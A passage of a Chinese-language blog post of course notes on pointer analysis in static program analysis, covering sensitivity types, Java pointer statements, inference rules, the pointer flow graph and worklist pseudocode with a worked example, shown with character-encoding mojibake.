·ï¼Œé‡å¤åˆ†æå‡½æ•°</li></ul></li><li>ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ<ul><li>åŒä¸€ä¸ªå‡½æ•°åªåˆ†æä¸€æ¬¡</li><li>åˆ†ææ—¶åˆå¹¶æ‰€æœ‰è°ƒç”¨çš„è¾“å…¥</li><li>ä¸€èˆ¬åœ°ç²¾åº¦è¾ƒä½</li></ul></li></ul><p>ä¸‹å›¾å·¦ä¾§ä¸ºä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œå³ä¾§ä¸ºä¸Šä¸‹æ–‡ä¸æ•æ„Ÿï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820211514827.png" alt="image-20200820211514827"></p><p>ä¸ªäººè®¤ä¸ºå¯¹äºç‰¹å®šçš„åˆ†æï¼ˆå¦‚æ±¡ç‚¹åˆ†æï¼‰åšå¥½å‡½æ•°æ‘˜è¦ï¼ˆsummaryï¼‰åï¼Œå°±å¯ä»¥åšä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„åˆ†æï¼ŒåŒæ—¶ä¸æŸå¤±ç²¾åº¦ã€‚</p><h2 id="æµæ•æ„Ÿ"><a href="#æµæ•æ„Ÿ" class="headerlink" title="æµæ•æ„Ÿ"></a>æµæ•æ„Ÿ</h2><p>åšæŒ‡é’ˆåˆ†ææ—¶ï¼Œå¯¹æ§åˆ¶æµçš„å¤„ç†</p><ul><li>æ§åˆ¶æµæ•æ„Ÿ[4]<ul><li>è€ƒè™‘æ‰§è¡Œé¡ºåº</li><li>ç»´æŠ¤æ¯ä¸€ç¨‹åºç‚¹çš„æŒ‡é’ˆæŒ‡å‘å…³ç³»</li></ul></li><li>æ§åˆ¶æµä¸æ•æ„Ÿ<ul><li>ä¿å­˜æ‰€æœ‰å¯èƒ½æŒ‡å‘çš„å¯¹è±¡</li></ul></li></ul><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820212053813.png" alt="image-20200820212053813"></p><p>å¦‚ä¸Šå›¾ä»£ç ä¸­ï¼Œæ§åˆ¶æµæ•æ„Ÿï¼ˆè“è‰²ï¼‰å¯¹æ¯ä¸ªç¨‹åºç‚¹éƒ½åšäº†è®°å½•ï¼Œè€Œæ§åˆ¶æµä¸æ•æ„Ÿï¼ˆæ©˜è‰²ï¼‰åˆ™ä¿å­˜æŒ‡é’ˆçš„æ‰€æœ‰å¯èƒ½æŒ‡å‘ï¼›</p><p>å…ˆå‰çš„æ•°æ®æµåˆ†æéƒ½æ˜¯æµæ•æ„Ÿçš„ï¼Œè€Œåœ¨javaè¯­è¨€çš„æŒ‡é’ˆåˆ†æä¸­ï¼ŒFlow-sensitiveæ•ˆæœæœªå¿…æ¯”Flow-insensitiveå¥½ï¼Œå› æ­¤ä¸»è¦ä»‹ç» insensitiveã€‚</p><h2 id="Analysis-Scope"><a href="#Analysis-Scope" class="headerlink" title="Analysis Scope"></a>Analysis Scope</h2><p>æŒ‡é’ˆåˆ†æå¯ä»¥åˆ†æå…¨ç¨‹åºï¼Œä¹Ÿå¯æ ¹æ®éœ€è¦åˆ†æéƒ¨åˆ†ä»£ç ä¸­çš„æŒ‡é’ˆä¿¡æ¯ï¼š</p><ul><li>Whole-program<ul><li>åˆ†æç¨‹åºæ‰€æœ‰ä¿¡æ¯</li></ul></li><li>Demand-driven<ul><li>åˆ†æéƒ¨åˆ†æŒ‡é’ˆä¿¡æ¯ </li><li>è®¡ç®—é‡æ¯”å…¨ç¨‹åºå°</li><li>ä½†è€ƒè™‘åˆ°ä¾èµ–ï¼Œæ‰€ä»¥è®¡ç®—é€Ÿåº¦æœªå¿…æ›´å¿«</li></ul></li></ul><h1 id="Concerned-Statements"><a href="#Concerned-Statements" class="headerlink" title="Concerned Statements"></a>Concerned Statements</h1><h2 id="Javaä¸­çš„æŒ‡é’ˆ"><a href="#Javaä¸­çš„æŒ‡é’ˆ" class="headerlink" title="Javaä¸­çš„æŒ‡é’ˆ"></a>Javaä¸­çš„æŒ‡é’ˆ</h2><ul><li>æœ¬åœ°å˜é‡ï¼ˆlocal variableï¼‰ï¼Œe.g., <code>x</code></li><li>é™æ€åŸŸï¼ˆstatic fieldï¼‰, e.g., <code>C.f</code>ï¼Œä½œä¸ºå…¨å±€å˜é‡åˆ†æï¼Œä¸æœ¬åœ°å˜é‡åˆ†ææ–¹æ³•ç±»ä¼¼ï¼ˆæœ¬è¯¾ä¸åšè®¨è®ºï¼‰</li><li>å¯¹è±¡åŸŸï¼ˆinstance fieldï¼‰ï¼Œe.g., <code>x.f</code>ï¼Œå®ä¾‹å¯¹è±¡çš„å±æ€§</li><li><p>æ•°ç»„å…ƒç´ ï¼ˆarray elementï¼‰ï¼Œe.g., array[i]ï¼Œç”±äºé™æ€åˆ†ææ²¡æ³•è®¡ç®—æ•°ç»„ä¸‹æ ‡ï¼Œé€šç”¨åšæ³•å°†å…¶ä½œä¸ºsingle fieldï¼Œä¸å¤„ç†instance fieldç±»ä¼¼ï¼ˆæœ¬è¯¾ä¸åšè®¨è®ºï¼‰<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820212836084.png" alt="image-20200820212836084"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒåŸå…ˆæ•°ç»„ä¸‹è¡¨çš„è®¿é—®<code>array[0]</code> å˜ä¸º<code>array.arr</code>ã€‚</p></li></ul><h2 id="ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥"><a href="#ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥" class="headerlink" title="ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥"></a>ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥</h2><ul><li>New: <code>x = new T()</code></li><li>Assign: <code>x = y</code></li><li>Store: <code>x.f = y</code></li><li>Load: <code>y = x.f</code></li><li>Call: <code>r = x.k (a, ...)</code></li></ul><p>æ³¨æ„å¯¹äºçœŸå®åœºæ™¯ä¸‹ <code>x.f.g.h=y</code> çš„æƒ…å†µï¼Œåœ¨ä¸‰åœ°å€ç è¡¨ç¤ºæ—¶å¯ä»¥ç”¨ä¸´æ—¶å˜é‡åšç®€åŒ–ï¼Œå˜ä¸º<code>t1=x.f; t2=t1.g; t2.h=y</code></p><p>å¯¹äºå¯¹è±¡è°ƒç”¨(Call)è¯­å¥ï¼Œå­˜åœ¨ä¸‰ç§è°ƒç”¨ç±»å‹ï¼š</p><ul><li>Static callï¼š<code>C.foo()</code></li><li>Special call: <code>super.foo()/x.&lt;init&gt;()/this.privateFoo()</code></li><li>Virtual call: <code>x.foo()</code></li></ul><p>ç”±äº static callå’Œspecial all éƒ½åªæœ‰ä¸€ç§å‡½æ•°åŸå‹ï¼Œå› æ­¤åªéœ€åˆ†ævirtual callçš„æƒ…å†µã€‚</p><h1 id="Pointer-Analysis-Rules"><a href="#Pointer-Analysis-Rules" class="headerlink" title="Pointer Analysis: Rules"></a>Pointer Analysis: Rules</h1><h2 id="Domains-and-Notations"><a href="#Domains-and-Notations" class="headerlink" title="Domains and Notations"></a>Domains and Notations</h2><p>ä»¥ä¸‹ä¸ºéœ€è¦ç”¨åˆ°çš„å®šä¹‰ï¼š</p><ul><li>å˜é‡ï¼š$x,y \in V$</li><li>åŸŸï¼ˆFieldsï¼‰ï¼š$f,g\in F$</li><li>å¯¹è±¡ï¼ˆObjectsï¼‰ï¼š$o_i, o_j \in O$</li><li>å®ä¾‹å±æ€§ï¼ˆInstance fieldsï¼‰ï¼š$o_i.f, o_j.g \in O \times F$</li><li>æŒ‡é’ˆï¼š$Pointer = V \cup (O \times F)$</li></ul><p>æ³¨ï¼š</p><ul><li>$P(O)$ æŒ‡$O$çš„å¹‚é›†</li><li>$pt(p)$ è¡¨ç¤ºæŒ‡å‘ $p$ çš„æŒ‡é’ˆé›†åˆ</li></ul><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><p>$\frac{a}{b}$ä¸ºæ¨å¯¼ç¬¦å·ï¼Œå³å¦‚æœæ¡ä»¶ $a$ æ»¡è¶³ï¼Œé‚£ä¹ˆ $b$ ä¹Ÿæ»¡è¶³ï¼ˆåœ¨inferé‚£ä¹Ÿä»‹ç»è¿‡æ­¤ç¬¦å·ï¼‰ï¼Œä¸ªäººæ„Ÿè§‰å¯ä»¥ç†è§£ä¸º$\{a\}stmt\{b\}$ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºæ»¡è¶³$a$ åï¼Œè¿›è¡Œ$b$æ“ä½œã€‚</p><ul><li><p>Newï¼Œ<code>i: x = new T()</code>ï¼Œæ–°å»ºå¯¹è±¡æ—¶ï¼Œ $o_i$ åŠ å…¥æŒ‡é’ˆé›†ä¸­ (å†™æ³•ä¸åŒï¼‰ï¼š</p><script type="math/tex; mode=display">\frac{}{o_i \in pt(x)}</script></li><li><p>Assign, <code>x = y</code>ï¼Œå‡ºç°èµ‹å€¼åï¼Œè®©yæŒ‡å‘çš„å†…å®¹æŒ‡å‘xï¼š</p><script type="math/tex; mode=display">\frac{o_{i} \in p t(y)}{o_{i} \in p t(x)}</script></li><li><p>Store, <code>x.f = y</code>ï¼Œèµ‹å€¼ç»™å±æ€§æ—¶ï¼Œå°†æŒ‡å‘ $y$ çš„æŒ‡é’ˆä¹Ÿæ”¾å…¥ $o_{i}.f$ çš„é›†åˆä¸­ï¼š</p><script type="math/tex; mode=display">\frac{o_i \in pt(x), o_j \in pt(y)}{o_j \in pt(o_i.f)}</script></li></ul><ul><li>Load, <code>y = x.f</code>ï¼Œå±æ€§èµ‹å€¼ç»™å˜é‡æ—¶ï¼ŒæŒ‡å‘ $o_i.f$ çš„æŒ‡é’ˆæŒ‡å‘ $y$ï¼š<script type="math/tex; mode=display">\frac{o_{i} \in p t(x), o_{j} \in p t\left(o_{i} . f\right)}{o_{j} \in p t(y)}</script></li></ul><p>ä¸‹å›¾ç»™å‡ºå››ç§æƒ…å†µçš„å½¢è±¡è¡¨ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200821212128271.png" alt="image-20200821212128271"></p><h1 id="How-to-Implement-Pointer-Analysis"><a href="#How-to-Implement-Pointer-Analysis" class="headerlink" title="How to Implement Pointer Analysis"></a>How to Implement Pointer Analysis</h1><blockquote><p>Pointer analysis is to propagate points-to information among pointers (variables &amp; fields).</p></blockquote><p>æŒ‡é’ˆåˆ†æå°±æ˜¯åœ¨å˜é‡å’ŒåŸŸï¼ˆæŒ‡é’ˆï¼‰ä¸­ä¼ é€’æŒ‡å‘å†…å­˜çš„ä¿¡æ¯ã€‚</p><p>ä¹Ÿæœ‰è§‚ç‚¹æ˜¯æŒ‡é’ˆåˆ†æå°±æ˜¯æ±‚è§£ä¸€ç³»åˆ—æŒ‡é’ˆçš„çº¦æŸæ¡ä»¶[3]ã€‚</p><h2 id="Pointer-Flow-Graph"><a href="#Pointer-Flow-Graph" class="headerlink" title="Pointer Flow Graph"></a>Pointer Flow Graph</h2><p>å› æ­¤ä½¿ç”¨å›¾æ¥ä¿å­˜æŒ‡é’ˆä¹‹é—´çš„å…³ç³»ï¼Œå½“æŒ‡é’ˆ x å˜åŒ–æ—¶ï¼ŒåŒæ—¶éœ€è¦æ”¹å˜ x åç»§æŒ‡é’ˆçš„æŒ‡å‘å†…å®¹ã€‚</p><blockquote><p>Pointer flow graph of a program is a directed graph  that expresses how objects flow among the pointers in the program.</p></blockquote><p>å›¾ä¸­çš„ç‚¹ä¸ºæŒ‡é’ˆï¼ˆå˜é‡æˆ–è€…æŠ½è±¡å¯¹è±¡å®ä¾‹çš„åŸŸ/å±æ€§ï¼‰ï¼š</p><p>Nodesï¼š$Pointer = V \cup (O \times F)$</p><p>å›¾ä¸­çš„è¾¹ $x \rightarrow y $ è¡¨ç¤ºæŒ‡é’ˆ $x$ æŒ‡å‘çš„å¯¹è±¡ä¹Ÿè¢« $y$ æŒ‡å‘ï¼ˆ$x$ çš„æŒ‡é’ˆä¿¡æ¯æµå‘ $y$ ï¼‰</p><p>Edgesï¼š$Pointer \times Pointer$</p><p>å› æ­¤ï¼Œå…ˆå‰çš„å››æ¡è¯­å¥äº§ç”Ÿçš„è¾¹å¯ä»¥ç”¨ä¸‹å›¾è¡¨ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200823104858792.png" alt="image-20200823104858792"></p><h1 id="Pointer-Analysis-Algorithms"><a href="#Pointer-Analysis-Algorithms" class="headerlink" title="Pointer Analysis: Algorithms"></a>Pointer Analysis: Algorithms</h1><h2 id="Worklist"><a href="#Worklist" class="headerlink" title="Worklist"></a>Worklist</h2><p>$WL \subseteq      \left \langle Pointer, \mathcal{P}(O)\right \rangle^*$ï¼Œ å³WLä¸­çš„å…ƒç´ ä¸º$n, pts$ï¼Œè¡¨ç¤ºæŒ‡é’ˆ$n$å¯èƒ½æŒ‡å‘çš„å†…å­˜/å¯¹è±¡é›†åˆä¸º $pts$</p><h2 id="åŠ è¾¹å‡½æ•°-AddEdge-ï¼š"><a href="#åŠ è¾¹å‡½æ•°-AddEdge-ï¼š" class="headerlink" title="åŠ è¾¹å‡½æ•° AddEdge()ï¼š"></a>åŠ è¾¹å‡½æ•° AddEdge()ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddEdge</span><span class="params">(s, t)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> s â†’ t âˆ‰ PFG:</span><br><span class="line">        add s â†’ t to PFG  <span class="comment"># å°†s â†’ tåŠ å…¥PFG</span></span><br><span class="line">        <span class="keyword">if</span> pt(s) <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">            add &lt;t, pt(s)&gt; to WL <span class="comment"># å°†&lt;t,sæŒ‡å‘å†…å®¹&gt;åŠ å…¥å·¥ä½œé˜Ÿåˆ—</span></span><br></pre></td></tr></table></figure><p>å³è‹¥æ·»åŠ  $s \rightarrow t$ ï¼Œé¦–å…ˆæ£€æŸ¥è¯¥è¾¹æ˜¯å¦åœ¨PFGä¸­ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™å°†è¯¥è¾¹åŠ å…¥PFGï¼›å¹¶ä¸”æ£€æŸ¥ s æŒ‡å‘çš„å†…å­˜é›†åˆï¼Œå¦‚æœé›†åˆä¸ç©ºï¼Œåˆ™éœ€ä¿è¯ $s$ æŒ‡å‘çš„å†…å®¹è¢« $t$ æŒ‡å‘ï¼Œå³åŠ å…¥å·¥ä½œé˜Ÿåˆ—ä¸­ã€‚</p><h2 id="æŒ‡é’ˆä¼ æ’­å‡½æ•°-Propagate-ï¼š"><a href="#æŒ‡é’ˆä¼ æ’­å‡½æ•°-Propagate-ï¼š" class="headerlink" title="æŒ‡é’ˆä¼ æ’­å‡½æ•° Propagate()ï¼š"></a>æŒ‡é’ˆä¼ æ’­å‡½æ•° Propagate()ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Propagate</span><span class="params">(n, pts)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    n: æŒ‡é’ˆn</span></span><br><span class="line"><span class="string">    pts: nå¯èƒ½æŒ‡å‘çš„æ–°çš„æŒ‡é’ˆé›†åˆ</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> pts <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        pt(n) â‹ƒ= pts <span class="comment"># å°†ptså†…å®¹å­˜å…¥åˆ°æŒ‡é’ˆæŒ‡å‘çš„é›†åˆä¸­</span></span><br><span class="line">        <span class="keyword">for</span> each n â†’ s âˆˆ PFG</span><br><span class="line">        add s, pts to WL</span><br></pre></td></tr></table></figure><p>å³ pts ä¸ä¸ºç©ºæ—¶ï¼Œå°† $pts$ å†…å®¹å­˜å…¥ $n$ çš„æŒ‡é’ˆé›†åˆä¸­ï¼Œæ¥ç€æ‰¾nçš„åç»§sï¼Œå¯¹æ¯ä¸€ä¸ªsï¼Œå°† &lt;s, pts&gt; åŠ å…¥WLã€‚</p><h2 id="ä¸»å‡½æ•°-Solve-ï¼š"><a href="#ä¸»å‡½æ•°-Solve-ï¼š" class="headerlink" title="ä¸»å‡½æ•° Solve()ï¼š"></a>ä¸»å‡½æ•° <code>Solve()</code>ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Solve</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S: ç¨‹åºæ‰€æœ‰è¯­å¥</span></span><br><span class="line"><span class="string">    WLï¼šå·¥ä½œé˜Ÿåˆ—</span></span><br><span class="line"><span class="string">    PFGï¼š Pointer flow graph</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">WL = [] <span class="comment"># e.g., [&lt;n, pts&gt;] è¡¨ç¤ºæŒ‡é’ˆnå¯èƒ½ä¼šæŒ‡å‘ptsé›†åˆï¼ˆæ¯æ¬¡è¿­ä»£å°±ä¼šæœ‰æ–°çš„å¯èƒ½ï¼‰</span></span><br><span class="line">PFG = &#123;&#125; <span class="comment"># e.g., &#123;&lt;x, &#123;ğ‘œğ‘–&#125;&gt;&#125; è¡¨ç¤ºæŒ‡é’ˆxæŒ‡å‘å¯¹è±¡ğ‘œğ‘–</span></span><br><span class="line"><span class="keyword">for</span> each i: x = new T() âˆˆ ğ‘†: <span class="comment"># å¤„ç† new stmt</span></span><br><span class="line">add &lt;x, &#123;ğ‘œğ‘–&#125;&gt; to WL </span><br><span class="line"><span class="keyword">for</span> each x = y âˆˆ S: <span class="comment"># å¤„ç† assign stmt</span></span><br><span class="line">AddEdge(y, x)</span><br><span class="line"><span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        remove n, pts <span class="keyword">from</span> WL</span><br><span class="line">        Î” = pts - pt(n)</span><br><span class="line">        Propagate(n, Î”)</span><br><span class="line">        <span class="keyword">if</span> n represents a variable x:</span><br><span class="line">            <span class="keyword">for</span> each ğ‘œğ‘– âˆˆ Î”:</span><br><span class="line">                <span class="keyword">for</span> each x.f = y âˆˆ S: <span class="comment"># å¤„ç† store stmt</span></span><br><span class="line">                    AddEdge(y, ğ‘œğ‘–.ğ‘“)</span><br><span class="line">                <span class="keyword">for</span> each y = x.f âˆˆ S: <span class="comment"># å¤„ç† load stmt</span></span><br><span class="line">                    AddEdge(ğ‘œğ‘–.ğ‘“, y)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯ä»¥çœ‹åˆ°ï¼Œåœ¨9ã€11ã€19å’Œ21è¡Œåˆ†åˆ«å¤„ç†äº†newã€assignã€storeå’Œloadæ“ä½œï¼š</p><ul><li>å¯¹äºnewæ“ä½œï¼Œç›´æ¥å°† $\left \langle x, o_i \right\rangle$ åŠ å…¥worklist</li><li>å¯¹äºassignæ“ä½œï¼Œå°†xæŒ‡å‘çš„å†…å®¹ä¹Ÿè¢«yæŒ‡å‘ï¼Œå³è°ƒç”¨<code>AddEdge()</code></li></ul><p>æ¥ä¸‹æ¥è¿›å…¥å¾ªç¯ï¼Œç›´åˆ°å·¥ä½œé˜Ÿåˆ—ä¸ºç©ºï¼š</p><ol><li>å–å‡ºé˜Ÿå¤´è¦å¤„ç†çš„æŒ‡é’ˆnå’Œå…¶å¯¹åº”çš„pts</li><li>æ±‚å·®å¼‚ Î”ï¼Œptsä¸­çš„æœ‰ä¸€äº›åœ°å€å…ˆå‰å·²ç»ä¼ æ’­è¿‡ï¼Œåªéœ€å¤„ç†å‰©ä½™éƒ¨åˆ†</li><li>è°ƒç”¨<code>Propogate()</code>ï¼Œå°† Î” å†…å®¹æ”¾å…¥ $pt(n)$ å¹¶ä¸”æ·»åŠ æ–°çš„work</li></ol><p>æ¥ç€éœ€è¦å¤„ç†å¯¹è±¡æ“ä½œï¼Œ17-18çš„è¡Œæ„æŒ‡è‹¥æŒ‡é’ˆnè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå˜é‡ï¼ˆè€Œä¸æ˜¯field)ï¼Œé‚£ä¹ˆå¯¹äºæ¯ä¸€ä¸ª Î” ä¸­çš„å¯¹è±¡å®ä¾‹ï¼Œå¤„ç†æ‰€æœ‰ä¸ $x.f$ ç›¸å…³çš„ store å’Œ load æ“ä½œï¼Œå¯¹ store å’Œ load æ“ä½œéƒ½æ˜¯ä½¿ç”¨<code>AddEdge()</code>å¤„ç†ï¼ˆ19-22è¡Œï¼‰ã€‚</p><h2 id="å…·ä½“ç¤ºä¾‹"><a href="#å…·ä½“ç¤ºä¾‹" class="headerlink" title="å…·ä½“ç¤ºä¾‹"></a>å…·ä½“ç¤ºä¾‹</h2><p>è€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="keyword">new</span> C();</span><br><span class="line">a = b;</span><br><span class="line">c = <span class="keyword">new</span> C();</span><br><span class="line">c.f = a;</span><br><span class="line">d = c;</span><br><span class="line">c.f = d;</span><br><span class="line">e = d.f;</span><br></pre></td></tr></table></figure><p><strong>é¦–å…ˆç»è¿‡<code>solve():L9-12</code>çš„åˆå§‹åŒ–ï¼š</strong></p><ul><li>WL=[&lt;b,{o1}&gt;, &lt;c,{o3}&gt;]</li><li><p>PFG:</p><pre class="mermaid">  graph RL    b("b{}") --> a("a{}")    c("c{}") --> d("d{}")</pre></li></ul><p><strong>å¤„ç†&lt;b,{o1}&gt;</strong>: ä¸»è¦æ‰§è¡Œç¬¬16è¡Œ<code>Propagate()</code></p><ul><li>WL=[&lt;c,{o3}&gt;, &lt;a,{o1}&gt;]ï¼Œå› ä¸ºbâ†’aï¼Œæ‰€ä»¥å¢åŠ äº†ä¸€ä¸ªæ–°work</li><li>PFG:<pre class="mermaid">  graph RL    b("b{o1}") --> a("a{}")    c("c{}") --> d("d{}")</pre></li></ul><p><strong>å¤„ç†&lt;c, {o3}&gt;</strong>ï¼Œé™¤äº†<code>propagate(c, {o3})</code>ï¼Œæ³¨æ„åˆ°ç¬¬ 4 è¡Œå’Œç¬¬ 6 è¡Œï¼Œæ‰€ä»¥è¿˜éœ€å¤„ç†storeï¼Œå³<code>AddEdge(a,o3.f)</code>,<code>AddEdge(d,o3.f)</code>ï¼Œå› ä¸ºç›®å‰ a å’Œ d æŒ‡å‘å†…å®¹éƒ½æ˜¯ç©ºé›†ï¼Œæ‰€ä»¥ WL ä¸å¢åŠ ï¼š</p><ul><li>WL=[&lt;a,{o1}&gt;, &lt;d,{o3}&gt;]</li><li>PFG:    <pre class="mermaid">  graph RL    b("b{o1}") --> a("a{}")    c("c{o3}") --> d("d{}")    a-->o3.f["o3.f{}"]     d-->o3.f</pre></li></ul><p><strong>å¤„ç†&lt;a,{o1}&gt;</strong>ï¼Œ<code>propagate(a, {o1})</code>ï¼š</p><ul><li>WL=[&lt;d,{o3}&gt;, &lt;o3.f, {o1}&gt;]</li><li>PFG:    <pre class="mermaid">  graph RL    b("b{o1}") --> a("a{o1}")    c("c{o3}") --> d("d{}")    a-->o3.f["o3.f{}"]     d-->o3.f</pre></li></ul><p><strong>å¤„ç†&lt;d,{o3}&gt;</strong>ï¼Œ<code>propagate(d, {o3})</code>, ä»¥åŠæ³¨æ„åˆ°ç¬¬ 7 è¡Œçš„ load è¯­å¥ï¼Œè°ƒç”¨<code>AddEdge(o3.f,e)</code>ï¼š</p><ul><li>WL=[&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;]</li><li><p>PFG:    </p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{o1}")    c("c{o3}") --> d("d{o3}")    a-->o3.f["o3.f{}"]     d-->o3.f    o3.f --> e("e{}")</pre></li></ul><p><strong>åé¢æ­¥éª¤çœç•¥ï¼Œæœ€å PFG ç»“æœä¸ºï¼š</strong></p><pre class="mermaid">graph RL      b("b{o1}") --> a("a{o1}")      c("c{o3}") --> d("d{o3}")      a-->o3.f["o3.f{o1, o3}"]       d-->o3.f      o3.f --> e("e{o1, o3}")</pre><p>å¯ä»¥çœ‹åˆ° PFG ä¸­å·²ç»è®°å½•äº†æ¯ä¸ªæŒ‡é’ˆå˜é‡å¯èƒ½æŒ‡å‘çš„å¯¹è±¡ã€‚</p><h1 id="Pointer-Analysis-with-Method-Calls"><a href="#Pointer-Analysis-with-Method-Calls" class="headerlink" title="Pointer Analysis with Method Calls"></a>Pointer Analysis with Method Calls</h1><p>åœ¨åˆ†æ call statments æ—¶ï¼Œéœ€è¦åšè¿‡ç¨‹é—´åˆ†æï¼Œå³éœ€è¦æ„å»º call graphï¼Œå·²çŸ¥çš„ CHA æ„å»ºçš„ call graph æ˜¯ä¸å‡†ç¡®çš„ï¼Œæœ¬èŠ‚è¯¾ä»‹ç»å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆåˆ†ææœ¬èº«æ„å»º call graphï¼Œå³å®Œæˆè·¨å‡½æ•°çš„æŒ‡é’ˆåˆ†æã€‚</p><h2 id="Rule-Call"><a href="#Rule-Call" class="headerlink" title="Rule: Call"></a>Rule: Call</h2><p>å¯¹äºä¹‹å‰å¿½ç•¥çš„ Call stmtï¼Œæœ‰å¦‚ä¸‹æ¨å¯¼è§„åˆ™ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200823202143283.png" alt="image-20200823202143283"></p><p>ä¸»è¦æœ‰4éƒ¨åˆ†ï¼š</p><ol><li>ç”± $Dispatch(o_i, k)$ è·å–ç›®æ ‡æ–¹æ³•ï¼Œ$Dispatch()$ å®ç°ä¸ä¹‹å‰ CHA åˆ†æç›¸åŒï¼š<script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script></li><li>è¢«$x$ æŒ‡å‘çš„å¯¹è±¡$o_i$ ï¼Œä¹Ÿè¢« $m_{this}$ æŒ‡å‘ï¼›</li><li>å¯¹äºæ¯ä¸€ä¸ªå®å‚$a_j$æ‰€æŒ‡å‘çš„ä¿¡æ¯ï¼Œä¹Ÿè¢«å½¢å‚ $m_{pj}$ æ‰€æŒ‡å‘â€”â€”åœ¨PFGä¸Šå¢åŠ  â€œå®å‚â†’å½¢å‚â€è¾¹ï¼›</li><li>å¯¹äºè¢«è¿”å›å€¼ $m_{ret}$ æŒ‡å‘çš„å¯¹è±¡$o_v$ï¼Œä¹Ÿè¢«ç­‰å·å·¦è¾¹å˜é‡ $r$ æŒ‡å‘â€”â€”åœ¨PFGä¸Šå¢åŠ â€œretâ†’râ€çš„è¾¹ã€‚</li></ol><p><strong>è®¨è®ºä¸ºä»€ä¹ˆå¯¹äº $m_{this}$ ä¸å¢åŠ è¾¹ï¼Œè€Œå¯¹å…¶ä»–å‚æ•°å°±å¢åŠ è¾¹ï¼š</strong></p><p>æ³¨æ„åˆ° $x$ æŒ‡å‘çš„ä¿¡æ¯æ˜¯ä¸€ä¸ªé›†åˆï¼Œè€Œ $m_{this}$ ç”±$Dispatch()$ è§£æåå¯ä»¥å”¯ä¸€ç¡®å®šä¸€ä¸ªå¯¹è±¡ï¼Œæ¢å¥è¯è¯´ï¼š</p><ol><li><p>å¯¹äºthisæ¥è¯´ï¼ŒæŒ‡é’ˆåˆ†æå·²ç»å¯ä»¥å”¯ä¸€ç¡®å®šè¯¥å¯¹è±¡å®ä¾‹ï¼Œè‹¥ä¼ é€’ $x$ çš„æŒ‡å‘å¯¹è±¡é›†åˆåè€Œé€ æˆåˆ†æä¸å‡†ç¡®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img 